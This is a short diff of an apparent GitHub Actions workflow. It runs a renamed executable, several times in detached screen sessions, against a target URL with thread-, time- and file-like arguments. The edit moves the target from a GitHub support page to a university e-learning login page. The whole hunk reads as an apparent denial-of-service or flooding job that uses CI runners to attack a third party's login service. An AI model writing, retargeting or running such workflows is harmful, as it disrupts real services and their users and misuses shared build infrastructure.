@@ -36,10 +36,10 @@ jobs:
           chmod +x *
           mv tol o          
           
-          screen -dms ve ./o https://support.github.com/request/landing? 240 1 1 90.txt
-          screen -dms ve ./o https://support.github.com/request/landing? 240 1 1 90.txt
+          screen -dms ve ./o https://elearning.paruluniversity.ac.in/auth/login? 240 1 1 90.txt
+          screen -dms ve ./o https://elearning.paruluniversity.ac.in/auth/login? 240 1 1 90.txt
           
-          ./o https://support.github.com/request/landing 240 1 1  90.txt
+          ./o https://elearning.paruluniversity.ac.in/auth/login 240 1 1  90.txt
 
           
 
